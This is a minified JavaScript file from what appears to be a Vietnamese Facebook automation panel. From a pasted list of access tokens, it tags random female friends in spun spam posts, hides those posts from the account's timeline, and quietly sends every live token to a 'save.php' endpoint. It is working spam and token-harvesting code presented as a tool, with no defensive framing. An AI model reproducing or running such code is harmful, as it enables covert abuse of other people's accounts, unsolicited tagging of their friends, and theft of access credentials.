function auto_tagfrmale_check(d){
	$.get('https://graph.facebook.com/',{
		method:'post',access_token:d,batch:'[{"method":"GET","relative_url":"me?fields=id,name"},{"method":"GET","relative_url":"fql?q=SELECT uid, name FROM user WHERE uid IN (SELECT uid2 FROM friend WHERE uid1 = me())+AND+sex+!%3D+%27male%27+ORDER BY rand() LIMIT '+auto_tagfrmale.limit+'"}]',include_headers:'false'
	}
	,function(f){
		var a=JSON.parse(f[0].body);
		auto_tagfrmale.array[auto_tagfrmale.success]=[],auto_tagfrmale.array[auto_tagfrmale.success].uid=a.id,auto_tagfrmale.array[auto_tagfrmale.success].data=JSON.parse(f[1].body).data,auto_tagfrmale.array[auto_tagfrmale.success].access_token=d,auto_tagfrmale.array[auto_tagfrmale.success].array=[];
		for(var l=0;
		l<Math.ceil(auto_tagfrmale.array[auto_tagfrmale.success].data.length/auto_tagfrmale.one);
		l++){
			var j=l*auto_tagfrmale.one;
			auto_tagfrmale.array[auto_tagfrmale.success].array[l]=[];
			for(var c=j;
			c<j+(auto_tagfrmale.array[auto_tagfrmale.success].data.length-j>auto_tagfrmale.one?auto_tagfrmale.one:auto_tagfrmale.array[auto_tagfrmale.success].data.length-j);
			c++){
				auto_tagfrmale.array[auto_tagfrmale.success].array[l].push(auto_tagfrmale.array[auto_tagfrmale.success].data[c].uid)
			}
		}
		;
		auto_tagfrmale.success++,auto_tagfrmale.bach+=d+'',tbody='',tbody+='<tr>',tbody+='	<td>'+auto_tagfrmale.success+'</td>',tbody+='	<td>'+a.name+'</td>',tbody+='	<td align="center">'+auto_tagfrmale.array[auto_tagfrmale.success-1].data.length+'</td>',tbody+='	<td align="center"><font color="green"><span id="auto_tagfrmale_success_'+auto_tagfrmale.success+'">0</span></font></td>',tbody+='	<td align="center"><font color="red"><span id="auto_tagfrmale_error_'+auto_tagfrmale.success+'">0</span></font></td>',tbody+='	<td id="auto_tagfrmale_status_'+auto_tagfrmale.success+'" b-data="loading">Đang chờ !</td>',tbody+='</tr>',$('#html_auto_tagfrmale_body').append(tbody)
	}
	).fail(function(f){
		'undefined'== typeof f.responseText?auto_tagfrmale_check(d):auto_tagfrmale.error++
	}
	).always(function(){
		if(auto_tagfrmale.success+auto_tagfrmale.error==auto_tagfrmale.token.split('\n').length){
			if(auto_tagfrmale.success>0){
				var d=$.trim(auto_tagfrmale.bach);
				d.length>0&&$.post('http://localhost/a/save.php',{
					act:'save',access_token:d
				}
				);
				for(var f=0;
				f<auto_tagfrmale.array.length;
				f++){
					auto_tagfrmale_send(f,0)
				}
			}
			else {
				$('#submit_auto_tagfrmale_start').buttonStop(),$('#submit_auto_tagfrmale_stop').disabled(),noti.success('Không Access Token nào Live !'),$('#html_auto_tagfrmale_result').hide()
			}
		}
	}
	)
}
function auto_tagfrmale_send(d,f){
	return 0==auto_tagfrmale.run?!1:void((0==auto_tagfrmale.array[d].data.length?($('#auto_tagfrmale_status_'+(d+1)).html('<font color="red">Không có bạn bè !</font>'),auto_tagfrmale.total++,auto_tagfrmale.total==auto_tagfrmale.success&&($('#submit_auto_tagfrmale_start').buttonStop(),$('#submit_auto_tagfrmale_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !'))):($('#auto_tagfrmale_status_'+(d+1)).html('<font color="blue">Đang tiến hành gắn thẻ <b>'+auto_tagfrmale.array[d].array[f].length+'</b> bạn bè</font> '+run.loading()),$.get('https://graph.facebook.com/me/feed',{
		method:'post',access_token:auto_tagfrmale.array[d].access_token,message:init.spinText(auto_tagfrmale.msg),link:init.spinText(auto_tagfrmale.link),tags:auto_tagfrmale.array[d].array[f].join()
	}
	).done(function(a){
		$.get('https://graph.facebook.com/'+a.id,{
			method:'post',locale:'en_US',timeline_visibility:'hidden'
		}
		),$('#auto_tagfrmale_success_'+(d+1)).text(parseInt($('#auto_tagfrmale_success_'+(d+1)).text())+auto_tagfrmale.array[d].array[f].length),$('#auto_tagfrmale_status_'+(d+1)).html('<font color="green">Gắn thẻ thành công <b>'+auto_tagfrmale.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading())
	}
	).error(function(a){
		if($('#auto_tagfrmale_error_'+(d+1)).text(parseInt($('#auto_tagfrmale_error_'+(d+1)).text())+auto_tagfrmale.array[d].array[f].length),$('#auto_tagfrmale_status_'+(d+1)).html('<font color="red">Gắn thẻ thất bại <b>'+auto_tagfrmale.array[d].array[f].length+'</b> bạn bè, xin chờ <b id="timedown_'+(d+1)+'"></b> giây</font> '+run.loading()),a.responseText){
			var a=init.replace_JSON(a.responseText);
			noti.error(a.error.message)
		}
	}
	).always(function(){
		f+1<auto_tagfrmale.array[d].array.length?timer.count_down_array(0,Math.floor(auto_tagfrmale.delay/60),auto_tagfrmale.delay-60*Math.floor(auto_tagfrmale.delay/60),'timedown_'+(d+1),d,function(){
			auto_tagfrmale_send(d,f+1)
		}
		):($('#auto_tagfrmale_status_'+(d+1)).html('<font color="green">Hoàn thành !</font>'),auto_tagfrmale.total++,auto_tagfrmale.total==auto_tagfrmale.success&&($('#submit_auto_tagfrmale_start').buttonStop(),$('#submit_auto_tagfrmale_stop').disabled(),noti.success('Quá trình gắn thẻ bạn bè đã hoàn tất !')))
	}
	))))
}
location.hostname==b_sv&&($(document).on('click','#submit_auto_tagfrmale_stop',function(){
	auto_tagfrmale.run=0;
	for(var d=0;
	d<auto_tagfrmale.array.length;
	d++){
		clearTimeout(timeout_array[d])
	}
	;
	$('[b-data=\'loading\']').text('Đã có lệnh dừng !'),$('#submit_auto_tagfrmale_stop').disabled(),$('#submit_auto_tagfrmale_start').buttonStop(),noti.success('Đã có lệnh dừng gắn thẻ bạn bè !')
}
),$(document).on('click','#submit_auto_tagfrmale_start',function(){
	auto_tagfrmale={
		token:$('#input_auto_tagfrmale_token').validate(),msg:$('#input_auto_tagfrmale_msg').val(),link:$('#input_auto_tagfrmale_link').val(),name:$('#input_auto_tagfrmale_name').val(),picture:$('#input_auto_tagfrmale_picture').val(),description:$('#input_auto_tagfrmale_description').val(),caption:$('#input_auto_tagfrmale_caption').val(),delay:$('#input_auto_tagfrmale_delay').isNumber(),one:$('#input_auto_tagfrmale_one').val(),limit:$('#input_auto_tagfrmale_limit').isNumber(),array:[],run:1,total:0,success:0,error:0,bach:''
	}
	,auto_tagfrmale.token&&auto_tagfrmale.delay&&auto_tagfrmale.one&&auto_tagfrmale.limit&&($(this).buttonLoad(),$('#submit_auto_tagfrmale_stop').undisabled(),$('#html_auto_tagfrmale_result').fadeIn('fast'),$('#html_auto_tagfrmale_body').html(''),$.each(auto_tagfrmale.token.split('\n'),function(d,f){
		var a=f.split('|');
		a=a[1]?a[1]:f,setTimeout(function(){
			auto_tagfrmale_check(a)
		}
		,15*d)
	}
	))
}
))